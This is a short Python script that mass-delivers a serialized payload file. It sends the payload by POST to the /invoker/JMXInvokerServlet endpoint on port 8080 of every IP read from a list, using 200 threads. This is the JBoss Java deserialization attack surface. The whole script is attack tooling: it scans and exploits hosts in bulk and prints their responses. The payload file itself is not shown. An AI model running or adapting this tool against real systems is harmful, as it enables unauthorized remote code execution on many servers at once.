import requests
import sys
import queue
import threading
class test():
	def __init__(self,file):
		self.file=file


	def post(self,ip):
		with open(self.file,mode='rb') as f:
			file=f.read()
		target='http://'+ip+':8080'+'/invoker/JMXInvokerServlet'
		print(target)
		r=requests.post(target,data=file)
		print(r.content)

	def worker(self,q):
		while not q.empty():
			ip=q.get()
			try:
				self.post(ip)
			finally:
				q.task_done()


if __name__ == '__main__':
	# print("Example: python postser.py 192.168.0.1 test.ser")
	# if len(sys.argv)!=3:
	# 	print("format wrong")
	# 	sys.exit()

	q=queue.Queue()
	a=test(sys.argv[2])
	ip=sys.argv[1]
	# file=sys.argv[2]
	# iplist=[]
	with open(ip,mode='rb') as ipf:
		for line in ipf.readlines():
			# print(line.decode('utf-8'))
			q.put(line.decode('utf-8'))
			# iplist.append(line.decode('utf-8'))
	threads=[threading.Thread(target=a.worker,args=(q,)) for i in range(200)]
	list(map(lambda x:x.start(),threads))
	q.join()
	print("scan over")
	# while not q.empty():
	# 		print(q.get())

		# print(str(ipf.readline()))
		# while q.put(ipf.readline())!=None:
		# 	print (q.get())

	# a=test(ip,file)
	# a.post()